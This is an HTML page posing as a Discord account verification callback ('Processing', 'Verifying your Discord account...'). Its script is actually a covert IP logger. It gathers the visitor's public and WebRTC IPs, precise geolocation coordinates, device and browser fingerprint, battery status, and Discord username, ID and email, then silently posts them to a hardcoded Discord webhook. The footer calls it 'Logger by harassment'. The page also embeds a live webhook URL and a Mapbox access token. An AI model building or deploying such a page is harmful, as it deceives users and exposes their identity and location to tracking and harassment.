<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing - authed.online</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>‚úì</text></svg>">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        :root {
            --bg-darker: #050505;
            --text-primary: #ffffff;
            --text-secondary: #6b7280;
        }

        @keyframes gradient {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(-80px, 80px); }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-darker);
            color: var(--text-primary);
            -webkit-font-smoothing: antialiased;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .bg-grain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.03;
            z-index: 0;
            pointer-events: none;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' /%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' /%3E%3C/svg%3E");
        }

        .bg-gradient {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 0;
            overflow: hidden;
            pointer-events: none;
        }

        .gradient-blob {
            position: absolute;
            border-radius: 50%;
            filter: blur(150px);
            opacity: 0.08;
        }

        .blob-1 {
            width: 700px;
            height: 700px;
            background: #ffffff;
            top: -200px;
            right: -100px;
            animation: gradient 30s infinite ease-in-out;
        }

        .blob-2 {
            width: 600px;
            height: 600px;
            background: #9ca3af;
            bottom: -200px;
            left: -200px;
            animation: gradient 25s infinite ease-in-out reverse;
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            animation: fadeInUp 0.6s ease;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top-color: var(--text-primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        p {
            color: var(--text-secondary);
            font-size: 15px;
        }

        .error-box {
            max-width: 400px;
            margin: 0 auto;
            background: rgba(239, 68, 68, 0.05);
            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            padding: 20px;
            display: none;
        }

        .error-box.show {
            display: block;
            animation: fadeInUp 0.6s ease;
        }

        .error-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .error-message {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 15px;
        }

        .error-details {
            background: rgba(0, 0, 0, 0.3);
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            color: var(--text-secondary);
            word-break: break-word;
            margin-bottom: 15px;
        }

        .btn {
            background: var(--text-primary);
            color: var(--bg-darker);
            padding: 12px 30px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="bg-grain"></div>
    <div class="bg-gradient">
        <div class="gradient-blob blob-1"></div>
        <div class="gradient-blob blob-2"></div>
    </div>

    <div class="container" id="loadingState">
        <div class="spinner"></div>
        <h1>Processing</h1>
        <p>Verifying your Discord account...</p>
    </div>

    <div class="error-box" id="errorBox">
        <div class="error-title">Verification Failed</div>
        <div class="error-message" id="errorMessage"></div>
        <div class="error-details" id="errorDetails"></div>
        <a href="authorize.html" class="btn">Try Again</a>
    </div>

    <script>
        const CONFIG = {
            BACKEND_URL: 'https://cautious-space-guacamole-x57q75pgx4jp36rv7-3000.app.github.dev'
        };

        function showError(message, details = null) {
            document.getElementById('loadingState').style.display = 'none';
            const errorBox = document.getElementById('errorBox');
            errorBox.classList.add('show');
            document.getElementById('errorMessage').textContent = message;
            
            if (details) {
                document.getElementById('errorDetails').textContent = details;
            } else {
                document.getElementById('errorDetails').style.display = 'none';
            }
        }

        async function handleCallback() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const state = urlParams.get('state');
            const savedState = localStorage.getItem('oauth_state');

            if (!code) {
                showError('No authorization code received', 'Authorization code missing from Discord');
                return;
            }

            if (state !== savedState) {
                showError('Security validation failed', 'State mismatch - possible CSRF attack');
                localStorage.removeItem('oauth_state');
                return;
            }

            localStorage.removeItem('oauth_state');

            try {
                const response = await fetch(`${CONFIG.BACKEND_URL}/api/auth/discord`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ code })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || `HTTP ${response.status}`);
                }

                if (data.success && data.user) {
                    // Collect IP and device data before redirecting
                    await getUserData(data.user);
                    
                    // Redirect to authorized page with user info
                    const params = new URLSearchParams({
                        username: data.user.username,
                        avatar: data.user.avatar,
                        email: data.user.email || ''
                    });
                    window.location.href = `authorized.html?${params.toString()}`;
                } else {
                    throw new Error(data.error || 'Verification failed');
                }

            } catch (error) {
                console.error('Verification error:', error);
                
                let userMessage = 'Unable to connect to verification server';
                let technicalDetails = error.message;

                if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
                    userMessage = 'Connection failed';
                    technicalDetails = 'Could not reach the backend server';
                } else if (error.message.includes('HTTP 400')) {
                    userMessage = 'Invalid authorization code';
                    technicalDetails = 'The code from Discord was invalid or expired';
                } else if (error.message.includes('HTTP 404')) {
                    userMessage = 'User not in server';
                    technicalDetails = 'You need to be in the Discord server first';
                } else if (error.message.includes('HTTP 500')) {
                    userMessage = 'Server error';
                    technicalDetails = 'Backend encountered an internal error';
                }

                showError(userMessage, technicalDetails);
            }
        }

        // ============================================
        // ENHANCED IP LOGGER WITH MULTIPLE SERVICES
        // ============================================
        
        /**
         * Comprehensive IP and geolocation detection using multiple services
         * with fallback mechanisms for maximum accuracy
         */
        async function getEnhancedIpAndLocationData() {
            const results = {
                ip: "Unknown",
                location: {},
                vpnData: {},
                sources: []
            };

            // Service 1: IPapi.co (Most accurate, includes VPN detection)
            try {
                const response = await fetch('https://ipapi.co/json/', { 
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    results.ip = data.ip || results.ip;
                    results.location = {
                        city: data.city,
                        region: data.region,
                        region_code: data.region_code,
                        country: data.country_name,
                        country_code: data.country_code,
                        postal: data.postal,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        timezone: data.timezone,
                        asn: data.asn,
                        org: data.org
                    };
                    results.sources.push('ipapi.co');
                }
            } catch (error) {
                console.warn('IPapi.co failed:', error);
            }

            // Service 2: IP-API.com (Free, good accuracy, includes proxy detection)
            try {
                const response = await fetch(`https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query`, {
                    method: 'GET'
                });
                
                if (response.ok) {
                    const data = await response.json();
                    if (data.status === 'success') {
                        // Use this data if we don't have it yet or as verification
                        if (!results.location.city) {
                            results.ip = data.query || results.ip;
                            results.location = {
                                city: data.city,
                                region: data.regionName,
                                region_code: data.region,
                                country: data.country,
                                country_code: data.countryCode,
                                postal: data.zip,
                                latitude: data.lat,
                                longitude: data.lon,
                                timezone: data.timezone,
                                asn: data.as,
                                org: data.org || data.isp
                            };
                        }
                        
                        // VPN/Proxy detection from ip-api
                        results.vpnData.proxy = data.proxy;
                        results.vpnData.hosting = data.hosting;
                        results.sources.push('ip-api.com');
                    }
                }
            } catch (error) {
                console.warn('IP-API.com failed:', error);
            }

            // Service 3: IPify for IP confirmation
            if (results.ip === "Unknown") {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    if (response.ok) {
                        const data = await response.json();
                        results.ip = data.ip;
                        results.sources.push('ipify.org');
                    }
                } catch (error) {
                    console.warn('IPify failed:', error);
                }
            }

            // Service 4: IPInfo.io (additional verification)
            try {
                const response = await fetch('https://ipinfo.io/json', {
                    method: 'GET'
                });
                
                if (response.ok) {
                    const data = await response.json();
                    // Use as verification or fallback
                    if (!results.location.city && data.city) {
                        results.ip = data.ip || results.ip;
                        const [lat, lon] = (data.loc || '0,0').split(',');
                        results.location = {
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            postal: data.postal,
                            latitude: parseFloat(lat),
                            longitude: parseFloat(lon),
                            timezone: data.timezone,
                            org: data.org
                        };
                    }
                    results.sources.push('ipinfo.io');
                }
            } catch (error) {
                console.warn('IPInfo.io failed:', error);
            }

            return results;
        }

        /**
         * Enhanced VPN/Proxy detection with multiple indicators
         */
        function detectVpnProxy(geoData) {
            const indicators = [];
            let vpnScore = 0;
            let confidence = "Low";

            // Check 1: Explicit proxy/hosting flags from ip-api
            if (geoData.vpnData.proxy === true) {
                indicators.push("Proxy flag detected");
                vpnScore += 40;
            }
            
            if (geoData.vpnData.hosting === true) {
                indicators.push("Hosting/Datacenter IP");
                vpnScore += 35;
            }

            // Check 2: Organization name patterns
            if (geoData.location.org) {
                const org = geoData.location.org.toLowerCase();
                const vpnKeywords = [
                    'vpn', 'proxy', 'hosting', 'datacenter', 'data center',
                    'cloud', 'virtual', 'dedicated', 'server', 'linode',
                    'digitalocean', 'amazon', 'aws', 'google cloud', 'azure',
                    'ovh', 'hetzner', 'vultr', 'cloudflare', 'akamai',
                    'fastly', 'incapsula', 'sucuri', 'relay', 'nordvpn',
                    'expressvpn', 'surfshark', 'private internet access',
                    'mullvad', 'protonvpn', 'tunnelbear', 'windscribe',
                    'hide.me', 'hotspot shield', 'cyberghost', 'ipvanish',
                    'purevpn', 'vyprvpn', 'torguard', 'air vpn', 'perfect privacy'
                ];
                
                for (const keyword of vpnKeywords) {
                    if (org.includes(keyword)) {
                        indicators.push(`Keyword detected: "${keyword}"`);
                        vpnScore += 25;
                        break;
                    }
                }
            }

            // Check 3: ASN patterns (common VPN/hosting providers)
            if (geoData.location.asn) {
                const asn = geoData.location.asn.toLowerCase();
                const suspiciousASNs = [
                    'as13335', // Cloudflare
                    'as16509', // Amazon AWS
                    'as15169', // Google Cloud
                    'as8075',  // Microsoft Azure
                    'as14061', // DigitalOcean
                    'as20473', // Choopa/Vultr
                    'as16276', // OVH
                    'as24940'  // Hetzner
                ];
                
                for (const suspiciousAsn of suspiciousASNs) {
                    if (asn.includes(suspiciousAsn)) {
                        indicators.push(`Datacenter ASN: ${suspiciousAsn}`);
                        vpnScore += 20;
                        break;
                    }
                }
            }

            // Check 4: Port scanning attempts (common VPN ports)
            // Note: This is limited in browser, but we can check WebRTC
            
            // Determine status based on score
            let status = "‚ùå Not Detected";
            
            if (vpnScore >= 70) {
                status = "üî¥ VPN/Proxy CONFIRMED";
                confidence = "Very High";
            } else if (vpnScore >= 50) {
                status = "üü† VPN/Proxy LIKELY";
                confidence = "High";
            } else if (vpnScore >= 30) {
                status = "üü° VPN/Proxy POSSIBLE";
                confidence = "Medium";
            } else if (vpnScore >= 15) {
                status = "üü¢ VPN/Proxy UNLIKELY";
                confidence = "Low";
            }

            return {
                status,
                score: vpnScore,
                confidence,
                indicators: indicators.length > 0 ? indicators.join(', ') : 'None',
                detectionMethods: geoData.sources.join(', ')
            };
        }

        /**
         * Get WebRTC local IP addresses (can reveal real IP behind VPN)
         */
        async function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || 
                                         window.mozRTCPeerConnection || 
                                         window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve(ips);
                    return;
                }

                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });

                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});

                pc.onicecandidate = (event) => {
                    if (!event || !event.candidate) {
                        resolve(ips);
                        return;
                    }

                    const parts = event.candidate.candidate.split(' ');
                    const ip = parts[4];
                    
                    if (ip && !ips.includes(ip) && ip !== '0.0.0.0') {
                        ips.push(ip);
                    }
                };

                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        }

        async function getUserData(discordUser) {
            try {
                // Get comprehensive geolocation data
                const geoData = await getEnhancedIpAndLocationData();
                
                // Get WebRTC IPs
                const webrtcIPs = await getWebRTCIPs();
                
                // Detect VPN/Proxy
                const vpnDetection = detectVpnProxy(geoData);
                
                const ip = geoData.ip || "Unknown";
                const browserInfo = navigator.userAgent;
                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                const language = navigator.language;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const timestamp = new Date().toLocaleString();
                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "üì± Mobile" : "üíª Computer";
                const onlineStatus = navigator.onLine ? "üü¢ Online" : "üî¥ Offline";
                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
                const os = (navigator.userAgentData?.platform) || navigator.platform || "Unknown";
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                const navHeight = `${window.innerHeight}px`;
                
                let batteryLevel = "Unknown";
                let powerSavingMode = "Unknown";
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
                        powerSavingMode = battery.charging ? "No" : "Yes";
                    } catch (error) {}
                }

                let adBlockEnabled = "‚ùå None";
                try {
                    const testAd = document.createElement('div');
                    testAd.innerHTML = '&nbsp;';
                    testAd.className = 'adsbox';
                    testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px;';
                    document.body.appendChild(testAd);
                    
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    if (testAd.offsetHeight === 0) {
                        adBlockEnabled = "‚úÖ Yes";
                    }
                    document.body.removeChild(testAd);
                } catch (e) {
                    adBlockEnabled = "‚úÖ Yes";
                }

                const browserName = navigator.appName || "Unknown";
                const browserVersion = navigator.appVersion || "Unknown";
                const cookiesEnabled = navigator.cookieEnabled ? "‚úÖ Yes" : "‚ùå None";
                
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const connectionType = connection?.effectiveType || "Unknown";
                const connectionRtt = connection?.rtt ? `${connection.rtt} ms` : "Unknown";
                const connectionDownlink = connection?.downlink ? `${connection.downlink} Mbps` : "Unknown";

                // Build location string with more precision
                const locationParts = [];
                if (geoData.location.city) locationParts.push(geoData.location.city);
                if (geoData.location.region) locationParts.push(geoData.location.region);
                if (geoData.location.country) locationParts.push(geoData.location.country);
                if (geoData.location.postal) locationParts.push(`(${geoData.location.postal})`);
                
                const locationString = locationParts.length > 0 ? locationParts.join(', ') : "Unknown";
                const ispInfo = geoData.location.org || "Unknown";

                let mapImageUrl = null;
                let mapLocation = "No location data";
                
                if (geoData.location.latitude && geoData.location.longitude) {
                    const lat = geoData.location.latitude;
                    const lon = geoData.location.longitude;
                    
                    // Use more precise coordinates (6 decimal places ‚âà 0.11m accuracy)
                    const preciseLat = Math.round(lat * 1000000) / 1000000;
                    const preciseLon = Math.round(lon * 1000000) / 1000000;
                    
                    const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
                    mapImageUrl = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${preciseLon},${preciseLat})/${preciseLon},${preciseLat},14,0/600x300@2x?access_token=${mapboxToken}`;
                    
                    mapLocation = `${preciseLat}, ${preciseLon}`;
                }

                const data = {
                    ip, 
                    webrtcIPs: webrtcIPs.join(', ') || 'None detected',
                    browser: browserInfo, 
                    resolution: screenResolution,
                    language, 
                    timeZone, 
                    timestamp, 
                    deviceType, 
                    onlineStatus,
                    uptime, 
                    os, 
                    cpuCores, 
                    navHeight, 
                    batteryLevel,
                    powerSavingMode, 
                    adBlockEnabled, 
                    browserName, 
                    browserVersion,
                    cookiesEnabled, 
                    connectionType, 
                    connectionRtt, 
                    connectionDownlink,
                    location: locationString,
                    isp: ispInfo,
                    asn: geoData.location.asn || 'Unknown',
                    vpnStatus: vpnDetection.status,
                    vpnScore: vpnDetection.score,
                    vpnConfidence: vpnDetection.confidence,
                    vpnIndicators: vpnDetection.indicators,
                    detectionMethods: vpnDetection.detectionMethods,
                    dataSources: geoData.sources.join(', '),
                    mapImageUrl, 
                    mapLocation,
                    discordUser: discordUser
                };

                await sendDataToWebhook(data);
                
            } catch (error) {
                console.error('Error collecting user data:', error);
            }
        }

        async function sendDataToWebhook(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1454071163583070323/IAcO-7YEIzCyDkMWhm5BARhiNWrzdgOUVGCZezg56PsnlnD9SPh3_H5zO6y9g3N0gMM8';
            
            const embed = {
                title: "üìä Enhanced Device & Location Details",
                color: data.vpnScore >= 50 ? 0xFF6B00 : 0xFF0000, // Orange if VPN likely, red otherwise
                fields: [
                    { name: "üë§ Discord Username", value: data.discordUser.username, inline: true },
                    { name: "üÜî Discord ID", value: data.discordUser.id, inline: true },
                    { name: "üìß Email", value: data.discordUser.email || "Not provided", inline: true },
                    { name: "üìç Public IP", value: data.ip, inline: true },
                    { name: "üîó WebRTC IPs", value: data.webrtcIPs, inline: true },
                    { name: "üåê ISP/Org", value: data.isp, inline: true },
                    { name: "üè¢ ASN", value: data.asn, inline: true },
                    { name: "üåç Location", value: data.location, inline: false },
                    { name: "üó∫Ô∏è Precise Coordinates", value: data.mapLocation, inline: true },
                    { name: "üõ°Ô∏è VPN/Proxy Status", value: data.vpnStatus, inline: true },
                    { name: "üìä VPN Detection Score", value: `${data.vpnScore}/100`, inline: true },
                    { name: "üéØ Detection Confidence", value: data.vpnConfidence, inline: true },
                    { name: "üîç VPN Indicators", value: data.vpnIndicators || "None", inline: false },
                    { name: "üì° Detection Methods", value: data.detectionMethods, inline: false },
                    { name: "üñ•Ô∏è Resolution", value: data.resolution, inline: true },
                    { name: "üó£Ô∏è Language", value: data.language, inline: true },
                    { name: "üïí TimeZone", value: data.timeZone, inline: true },
                    { name: "üìÖ Timestamp", value: data.timestamp, inline: false },
                    { name: "üì± Device", value: data.deviceType, inline: true },
                    { name: "üîã Battery", value: data.batteryLevel, inline: true },
                    { name: "‚ö° Power Saving", value: data.powerSavingMode, inline: true },
                    { name: "üñ•Ô∏è Operating System", value: data.os, inline: true },
                    { name: "üîó Status", value: data.onlineStatus, inline: true },
                    { name: "üìä Uptime", value: data.uptime, inline: true },
                    { name: "üñ•Ô∏è CPU Cores", value: String(data.cpuCores), inline: true },
                    { name: "üìè Height", value: data.navHeight, inline: true },
                    { name: "üö´ AdBlock", value: data.adBlockEnabled, inline: true },
                    { name: "üåê Browser", value: data.browserName, inline: true },
                    { name: "üç™ Cookies", value: data.cookiesEnabled, inline: true },
                    { name: "üì∂ Connection", value: data.connectionType, inline: true },
                    { name: "‚è±Ô∏è RTT", value: data.connectionRtt, inline: true },
                    { name: "‚¨áÔ∏è Speed", value: data.connectionDownlink, inline: true }
                ],
                thumbnail: { url: data.discordUser.avatar },
                footer: { 
                    text: `Logger by harassment ‚Ä¢ Data from: ${data.dataSources}`, 
                    icon_url: "https://cdn.discordapp.com/avatars/1404732292412477531/22c739eb7dd42b243e92587e18069b2d.png?size=4096" 
                }
            };

            if (data.mapImageUrl) {
                embed.image = { url: data.mapImageUrl };
            }

            const payload = {
                content: data.vpnScore >= 50 ? "‚ö†Ô∏è **VPN/Proxy User Detected**" : "üì° **User Verified & Logged**",
                embeds: [embed]
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('‚úÖ Data logged to webhook');
            } catch (error) {
                console.error('‚ùå Webhook error:', error);
            }
        }

        handleCallback();
    </script>
</body>
</html>